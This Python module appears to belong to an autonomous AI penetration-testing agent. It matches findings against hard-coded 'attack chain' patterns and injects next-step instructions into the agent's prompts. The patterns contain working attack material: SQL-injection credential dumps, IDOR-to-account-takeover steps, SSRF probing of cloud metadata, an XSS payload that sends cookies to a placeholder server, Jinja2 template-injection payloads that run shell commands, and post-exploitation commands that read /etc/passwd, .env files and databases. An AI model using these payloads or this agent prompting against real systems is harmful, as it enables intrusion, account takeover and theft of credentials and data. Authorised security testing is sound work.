"""
suijin/fugu_chain.py — Attack Chain Tracker
=============================================
Sits alongside Fugu's TaskGraph. After each phase completes, reads the
Knowledge Graph for new findings, matches them against known attack-chain
patterns, and generates concrete "next step" suggestions for the next phase.

This turns isolated phase agents into a cohesive attack chain by feeding
specific findings forward — the exploit agent gets told exactly what recon
found, not just a task-graph status icon.

Design:
  - Reads FROM the Knowledge Graph (never modifies it directly)
  - Chain records written via tools.record_finding (preserves audit trail)
  - All existing notes/KG functionality stays intact
  - Consumer: fugu.py calls chainer.analyze() between phases

Chain patterns are heuristic (keyword + constraint matching) — no LLM needed.
This keeps it cheap, fast, and deterministic.
"""

import json
from pathlib import Path

from rich.console import Console

console = Console()
BASE_DIR = Path(__file__).resolve().parent
KG_PATH = BASE_DIR / "knowledge_graph.json"


# ---------------------------------------------------------------------------
# Chain Pattern Definitions
# ---------------------------------------------------------------------------
# Each pattern: (trigger_keywords, constraint_types, suggestion_text)
# When findings match trigger keywords AND have matching constraint types,
# the suggestion is injected into the next phase's prompt.

CHAIN_PATTERNS = [
    # ---- SQLi chains ------------------------------------------------
    {
        "name": "sqli_to_data_extraction",
        "triggers": ["sql", "injection", "sqli", "mysql", "postgres", "sqlite"],
        "constraint_types": ["behavior", "blocks"],
        "suggestion": (
            "🔗 CHAIN: SQL Injection confirmed. Next step → extract data.\n"
            "  • Use UNION SELECT to enumerate tables: sqlite_master, information_schema.tables\n"
            "  • Extract user credentials: SELECT username, password_hash, email FROM users\n"
            "  • Look for admin/privileged accounts in the results\n"
            "  • Check if extracted password hashes are crackable (weak hashing?)"
        ),
    },
    {
        "name": "sqli_to_auth_bypass",
        "triggers": ["login bypass", "auth bypass", "sqli bypass", "sql injection login", "admin' or", "' or 1=1"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: Login bypass confirmed. Next step → map authenticated surface.\n"
            "  • Access /dashboard, /admin, /settings, /projects as the bypassed user\n"
            "  • Check for role-based access controls — can you reach admin endpoints?\n"
            "  • Document which endpoints are accessible with the bypassed session"
        ),
    },
    {
        "name": "credential_dump_to_admin",
        "triggers": ["password", "hash", "credential", "admin", "dump", "extract"],
        "constraint_types": ["behavior", "verified_cve"],
        "suggestion": (
            "🔗 CHAIN: Credentials obtained. Next step → privilege escalation via admin login.\n"
            "  • Try extracted credentials on /login\n"
            "  • If admin credentials found, access /admin panel\n"
            "  • Check /admin/exec for command execution capabilities\n"
            "  • Look for sensitive internal data in admin views"
        ),
    },
    # ---- IDOR chains ------------------------------------------------
    {
        "name": "idor_to_enumeration",
        "triggers": ["idor", "direct object", "user id", "profile", "api"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: IDOR vulnerability found. Next step → enumerate all objects.\n"
            "  • Iterate through IDs: /api/users/1, /api/users/2, /api/users/N\n"
            "  • Collect emails, roles, security answers from each user\n"
            "  • Look for admin users (role=admin) — their accounts are high-value targets\n"
            "  • Check if any user has a weak/guessable security answer"
        ),
    },
    {
        "name": "info_leak_to_account_takeover",
        "triggers": ["security", "answer", "email", "leak", "enum", "idor", "api"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: User info leaked (email + security answer). Next step → account takeover.\n"
            "  • Use leaked security answers on /password-reset\n"
            "  • Target admin/high-privilege accounts first\n"
            "  • After reset, login with new password to access victim's data\n"
            "  • Check if victim has access to projects/systems you couldn't reach before"
        ),
    },
    # ---- SSRF chains ------------------------------------------------
    {
        "name": "ssrf_to_internal_discovery",
        "triggers": ["ssrf", "webhook fetch", "url fetch", "server-side request", "internal probe"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: SSRF vector found. Next step → internal service discovery.\n"
            "  • Probe localhost ports: 8080, 8081, 5432, 6379, 27017, 5401\n"
            "  • Check for cloud metadata: http://169.254.169.254/latest/meta-data/\n"
            "  • Look for internal APIs, admin panels, databases\n"
            "  • Any service responding on localhost is a new attack surface"
        ),
    },
    {
        "name": "internal_to_cloud_creds",
        "triggers": ["internal", "admin", "creds", "secret", "aws", "key", "metadata"],
        "constraint_types": ["behavior", "verified_cve"],
        "suggestion": (
            "🔗 CHAIN: Internal service found. Next step → extract cloud credentials.\n"
            "  • Check /admin/creds, /config, /.env, /debug endpoints\n"
            "  • Look for AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY patterns\n"
            "  • Check for database connection strings (RDS, MongoDB, Redis)\n"
            "  • These credentials may grant access to production infrastructure"
        ),
    },
    # ---- XSS chains -------------------------------------------------
    {
        "name": "xss_to_session_theft",
        "triggers": ["xss", "script", "stored", "reflect", "comment", "inject"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: XSS vulnerability found. Next step → session hijacking.\n"
            "  • Craft payload: <script>fetch('http://YOUR_SERVER/?c='+document.cookie)</script>\n"
            "  • If stored XSS, payload triggers when admin views the page\n"
            "  • Steal admin session cookie → use it to access /admin\n"
            "  • Check HttpOnly flag — if set, use XSS to make requests from victim's browser instead"
        ),
    },
    {
        "name": "session_to_admin_access",
        "triggers": ["session", "cookie", "hijack", "steal", "token"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: Session obtained. Next step → admin access.\n"
            "  • Set the stolen session cookie in your requests\n"
            "  • Access /admin, /admin/flag, /admin/exec\n"
            "  • Document what admin-level operations are possible\n"
            "  • Check if admin has access to other users' data or system configs"
        ),
    },
    # ---- SSTI chains ------------------------------------------------
    {
        "name": "ssti_to_rce",
        "triggers": ["ssti", "template", "jinja", "render", "injection"],
        "constraint_types": ["behavior", "bypass"],
        "suggestion": (
            "🔗 CHAIN: SSTI confirmed. Next step → remote code execution.\n"
            "  • Jinja2 RCE: {{ ''.__class__.__mro__[1].__subclasses__() }}\n"
            "  • Find subprocess.Popen: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n"
            "  • Execute: ls, cat /etc/passwd, env, find / -name '*.db'\n"
            "  • Read application source code to find more vulnerabilities"
        ),
    },
    {
        "name": "rce_to_data_exfil",
        "triggers": ["rce", "shell", "exec", "command", "popen", "system"],
        "constraint_types": ["behavior", "verified_cve"],
        "suggestion": (
            "🔗 CHAIN: RCE achieved. Next step → data exfiltration.\n"
            "  • Locate database files: find / -name '*.db' -o -name '*.sqlite'\n"
            "  • Dump database: sqlite3 database.db .dump\n"
            "  • Read config files: cat .env, cat config.json, cat settings.py\n"
            "  • Look for API keys, secrets, and other credentials"
        ),
    },
    # ---- Generic chains ---------------------------------------------
    {
        "name": "any_finding_to_deeper_probe",
        "triggers": [
            "new endpoint found",
            "directory discovered",
            "hidden parameter",
            "file upload endpoint",
            "api endpoint discovered",
        ],
        "constraint_types": ["behavior"],
        "suggestion": (
            "🔗 CHAIN: New attack surface discovered. Next step → probe deeper.\n"
            "  • Test the discovered endpoint/parameter with different HTTP methods\n"
            "  • Try common payloads: ', \", <, >, ;, |, &, $, {, }, ..\n"
            "  • Check for error messages that reveal backend technology\n"
            "  • Map all parameters — each one is a potential injection point"
        ),
    },
    {
        "name": "tech_fingerprint_to_cve",
        "triggers": [
            "apache",
            "nginx",
            "flask",
            "django",
            "php",
            "node",
            "express",
            "tomcat",
            "iis",
            "wordpress",
            "joomla",
            "drupal",
        ],
        "constraint_types": ["verified_cve", "behavior"],
        "suggestion": (
            "🔗 CHAIN: Technology stack identified. Next step → CVE matching.\n"
            "  • Use search_cve with the exact software name and version\n"
            "  • Prioritize CVEs with CVSS >= 7.0 and public PoCs\n"
            "  • Test the highest-severity CVE first\n"
            "  • Even if the PoC fails, the CVE description tells you the vulnerability class"
        ),
    },
]


# ---------------------------------------------------------------------------
# Chain Tracker
# ---------------------------------------------------------------------------
class ChainTracker:
    """Tracks attack chain progress across Fugu phases.

    Reads the Knowledge Graph after each phase, identifies what was found,
    and generates chain suggestions for the next phase.
    """

    def __init__(self):
        self._seen_findings = set()  # deduplicate suggestions
        self._chain_history = []  # ordered list of chains triggered

    def _load_kg(self):
        """Read the knowledge graph JSON file."""
        if not KG_PATH.exists():
            return {}
        try:
            return json.loads(KG_PATH.read_text(encoding="utf-8"))
        except Exception:
            return {}

    def _get_recent_findings(self, kg_data, target=None):
        """Extract recent findings from the KG for a target (or all targets)."""
        findings = []
        for tgt, entry in kg_data.items():
            if tgt.startswith("_"):
                continue
            if target and tgt != target:
                continue
            for ctype, items in entry.items():
                if ctype.startswith("_"):
                    continue
                if not isinstance(items, list):
                    continue
                for item in items:
                    if not isinstance(item, dict):
                        continue
                    findings.append(
                        {
                            "target": tgt,
                            "type": ctype,
                            "rule": item.get("rule", ""),
                            "evidence": item.get("evidence", ""),
                            "confidence": item.get("confidence", 1.0),
                        }
                    )
        # Sort by confidence desc
        findings.sort(key=lambda f: -f.get("confidence", 0))
        return findings

    def analyze(self, phase_role, phase_objective, target=None):
        """Analyze KG findings and return chain suggestions for the next phase.

        Args:
            phase_role:      the role of the NEXT phase (e.g. 'exploit')
            phase_objective: the objective of the NEXT phase
            target:          optional target hostname to scope findings

        Returns:
            chain_context:   string to inject into the agent prompt, or ""
        """
        kg = self._load_kg()
        if not kg:
            return ""

        findings = self._get_recent_findings(kg, target=target)
        if not findings:
            return ""

        # Match findings against chain patterns
        suggestions = []
        for finding in findings:
            finding_key = f"{finding['target']}|{finding['type']}|{finding['rule'][:80]}"
            if finding_key in self._seen_findings:
                continue
            self._seen_findings.add(finding_key)

            combined_text = f"{finding['rule']} {finding['evidence']} {finding['type']}".lower()

            for pattern in CHAIN_PATTERNS:
                # Check if this pattern applies to the finding
                trigger_match = any(t in combined_text for t in pattern["triggers"])
                type_match = finding["type"] in pattern["constraint_types"]
                if trigger_match and type_match and pattern["name"] not in self._chain_history:
                    self._chain_history.append(pattern["name"])
                    suggestions.append(pattern["suggestion"])
                    break  # one suggestion per finding

        if not suggestions:
            return ""

        # Build chain context block for the agent prompt
        context = (
            "\n\n# 🔗 ATTACK CHAIN ANALYSIS\n"
            "The following attack chains have been identified from previous phase findings. "
            "Act on these suggestions — they represent the most promising next steps "
            "based on confirmed vulnerabilities.\n\n"
        )
        for i, s in enumerate(suggestions, 1):
            context += f"## Chain {i}\n{s}\n\n"

        context += (
            "# CHAIN RULES\n"
            "1. Follow the chain suggestion before exploring new attack surface.\n"
            "2. Record every successful chain step with record_finding.\n"
            "3. If a chain step fails, document why and try the next chain.\n"
            "4. Completed chains are the highest-value findings — prioritize them.\n"
        )

        console.print(f"[bold magenta]🔗 Chain Tracker: {len(suggestions)} chain(s) identified[/bold magenta]")
        for h in self._chain_history[-len(suggestions) :]:
            console.print(f"  [dim]→ {h}[/dim]")

        return context

    def get_chain_summary(self):
        """Return a human-readable summary of all chains triggered."""
        if not self._chain_history:
            return "No attack chains triggered."
        lines = ["Attack Chains Triggered:"]
        for i, c in enumerate(self._chain_history, 1):
            lines.append(f"  {i}. {c}")
        return "\n".join(lines)

    def reset(self):
        """Reset chain tracker state for a new engagement."""
        self._seen_findings.clear()
        self._chain_history.clear()


# ---------------------------------------------------------------------------
# Module-level tracker — reset between engagements
# ---------------------------------------------------------------------------
_default_tracker: ChainTracker | None = None


def _get_tracker() -> ChainTracker:
    """Get or create the default tracker. Call reset() between engagements."""
    global _default_tracker
    if _default_tracker is None:
        _default_tracker = ChainTracker()
    return _default_tracker


def analyze_phase(phase_role, phase_objective, target=None):
    """Convenience: analyze using the default tracker instance."""
    return _get_tracker().analyze(phase_role, phase_objective, target=target)


def get_summary():
    """Convenience: get chain summary from default tracker."""
    return _get_tracker().get_chain_summary()


def reset():
    """Reset the default tracker. Call between engagements to prevent state leak."""
    global _default_tracker
    _default_tracker = ChainTracker()
